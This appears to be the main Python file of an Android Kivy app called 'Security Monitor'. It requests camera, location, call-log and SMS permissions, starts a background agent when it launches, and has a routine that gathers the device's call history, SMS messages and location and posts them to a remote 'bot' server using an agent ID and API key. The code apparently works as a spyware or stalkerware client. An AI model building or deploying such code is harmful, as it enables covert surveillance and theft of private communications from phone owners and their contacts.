#!/usr/bin/env python3

import threading
import traceback

from kivy.app import App
from kivy.clock import Clock
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.utils import platform


from config_builtin import BOT_URL, API_KEY, AGENT_ID
from main_service import run_agent


# ===============================
# ANDROID PERMISSIONS
# ===============================

if platform == "android":

    from android.permissions import (
        request_permissions,
        Permission
    )


def request_android_permissions():

    if platform == "android":

        request_permissions([

            Permission.CAMERA,

            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,

            Permission.READ_CALL_LOG,
            Permission.READ_PHONE_STATE,

            Permission.READ_SMS,
            Permission.RECEIVE_SMS,

            Permission.POST_NOTIFICATIONS,

        ])



# ===============================
# CONFIG
# ===============================

class AgentConfig:

    bot_url = BOT_URL
    api_key = API_KEY
    agent_id = AGENT_ID



# ===============================
# UI
# ===============================

class MonitorUI(BoxLayout):


    def __init__(self, **kwargs):

        super().__init__(
            orientation="vertical",
            spacing=20,
            padding=30,
            **kwargs
        )


        self.status_label = Label(

            text="Security Monitor\nReady",

            font_size="22sp"

        )

        self.add_widget(
            self.status_label
        )



        self.test_button = Button(

            text="Test Heartbeat",

            size_hint_y=0.2

        )

        self.test_button.bind(
            on_press=self.test_connection
        )

        self.add_widget(
            self.test_button
        )



        self.alert_button = Button(

            text="Send Test Alert",

            size_hint_y=0.2

        )

        self.alert_button.bind(
            on_press=self.send_test_alert
        )

        self.add_widget(
            self.alert_button
        )



        self.data_button = Button(

            text="Send Call SMS Location",

            size_hint_y=0.2

        )

        self.data_button.bind(
            on_press=self.send_data_test
        )

        self.add_widget(
            self.data_button
        )



    def set_status(self,msg):

        self.status_label.text = msg



    # ===============================
    # HEARTBEAT
    # ===============================


    def test_connection(self,_):

        threading.Thread(

            target=self._heartbeat_worker,

            daemon=True

        ).start()



    def _heartbeat_worker(self):

        try:

            import requests


            r=requests.post(

                f"{BOT_URL}/agent/heartbeat",

                json={

                    "device_info":{

                        "platform":"android",

                        "status":"online"

                    }

                },

                headers={

                    "X-Agent-ID":AGENT_ID,

                    "X-API-Key":API_KEY

                },

                timeout=20

            )


            msg=f"Heartbeat {r.status_code}"


        except Exception:

            msg=traceback.format_exc()



        Clock.schedule_once(

            lambda x:self.set_status(msg)

        )




    # ===============================
    # ALERT
    # ===============================


    def send_test_alert(self,_):

        threading.Thread(

            target=self._alert_worker,

            daemon=True

        ).start()



    def _alert_worker(self):

        try:

            import requests


            r=requests.post(

                f"{BOT_URL}/alert",

                json={

                    "title":
                    "APK Test Alert",

                    "description":
                    "Android security monitor test",

                    "severity":
                    "HIGH",

                    "device_info":{

                        "agent_id":AGENT_ID

                    }

                },

                headers={

                    "X-Agent-ID":AGENT_ID,

                    "X-API-Key":API_KEY

                },

                timeout=20

            )


            msg=f"Alert {r.status_code}"


        except Exception:

            msg=traceback.format_exc()



        Clock.schedule_once(

            lambda x:self.set_status(msg)

        )




    # ===============================
    # CALL SMS LOCATION DATA
    # ===============================


    def send_data_test(self,_):

        threading.Thread(

            target=self._data_worker,

            daemon=True

        ).start()



    def _data_worker(self):


        try:

            import requests


            from collectors.call_data import get_calls

            from collectors.sms_data import get_sms

            from collectors.location_data import get_location



            payload={


                "calls":
                get_calls(),


                "sms":
                get_sms(),


                "location":
                get_location()


            }



            r=requests.post(


                f"{BOT_URL}/agent/data",


                json=payload,


                headers={

                    "X-Agent-ID":AGENT_ID,

                    "X-API-Key":API_KEY,

                    "Content-Type":
                    "application/json"

                },


                timeout=30

            )



            msg=(

                f"DATA {r.status_code}\n"

                f"{r.text}"

            )



        except Exception:

            msg=traceback.format_exc()



        Clock.schedule_once(

            lambda x:self.set_status(msg)

        )




# ===============================
# APP
# ===============================


class SecurityMonitorApp(App):


    def build(self):


        request_android_permissions()



        threading.Thread(

            target=self.start_agent,

            daemon=True

        ).start()



        return MonitorUI()



    def start_agent(self):

        try:

            run_agent(

                AgentConfig()

            )

        except Exception:

            traceback.print_exc()




if __name__=="__main__":

    SecurityMonitorApp().run()
